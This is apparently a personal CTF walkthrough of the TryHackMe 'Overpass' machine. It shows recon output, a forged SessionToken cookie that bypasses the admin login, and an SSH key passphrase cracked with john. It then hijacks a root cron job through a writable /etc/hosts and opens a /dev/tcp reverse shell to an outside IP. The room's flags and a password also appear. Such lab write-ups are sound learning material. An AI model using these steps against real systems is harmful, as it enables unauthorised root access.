
## Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## HTTP

Feroxbuster with small directory

```
301        0l        0w        0c http://10.10.239.78/img
301        0l        0w        0c http://10.10.239.78/index.html
301        0l        0w        0c http://10.10.239.78/downloads
301        0l        0w        0c http://10.10.239.78/aboutus
301        2l        3w       42c http://10.10.239.78/admin
200       40l       93w     1525c http://10.10.239.78/admin.html
301        0l        0w        0c http://10.10.239.78/css
200       26l       54w      782c http://10.10.239.78/404.html

```


Login page at `/admin.html`

more information at 
`http://10.10.239.78/aboutus/`

```
Ninja - Lead Developer

Pars - Shibe Enthusiast and Emotional Support Animal Manager

Szymex - Head Of Security

Bee - Chief Drinking Water Coordinator

MuirlandOracle - Cryptography Consultant
```

Here i understand that they are storing passwords in rot47 format

`view-source:http://10.10.239.78/downloads/src/overpass.go`

```
//Decrypt passwords
	buff = []byte(rot47(string(buff)))
	//Load decrypted passwords
```


Got stuck here and used this writeup `https://termack.github.io/thm_writeups/overpass`

and also this one

we set our own cookie value with 

```bash
Cookie: SessionToken=1
```

and when we try to access the `/admin`

we are not prompted to login


## Shell

1. After logging into /admin we are straigh away given a priate RSA that we can use to login
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNs.
.
.
.
.
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```


with a comment `Since you keep forgetting your password, James, I've set up SSH keys for you.`


`Also, we really need to talk about this "Military Grade" encryption. - Paradox`


2. When promted for a passphrase when using the rsa key

we crack it using the `ssh2john` and `john` tools and we get a hit

`james13          (id_rsa)`

```
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```


## Priv Esc

1. found an interesting file 
```
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```


used this information to retrieve some credentials

```
james@overpass-prod:~$ overpass

Choose an option:	4
System 	 saydrawnlyingpicture
```

2. took a hint from the writeup

`/etc/hosts` is writable by the user `james` and a every minute cronjob is running with root privileges

```
 * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```


 i changed the entry in `/etc/hosts` file to my own IP and created a duplicate  `/downloads/src/buildsrcipt.sh`
with a reverse shell bash command

```
0<&196;exec 196<>/dev/tcp/10.17.24.189/9999; sh <&196 >&196 2>&196

```

turned my machine into a web server using 

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/overpass]
└──╼ $sudo python3 -m http.server 80
```

```
─[glack@parrot]─[~/Desktop/shellgen]
└──╼ $nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.17.24.189] from (UNKNOWN) [10.10.239.78] 53090
id
uid=0(root) gid=0(root) groups=0(root)

```

```
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```
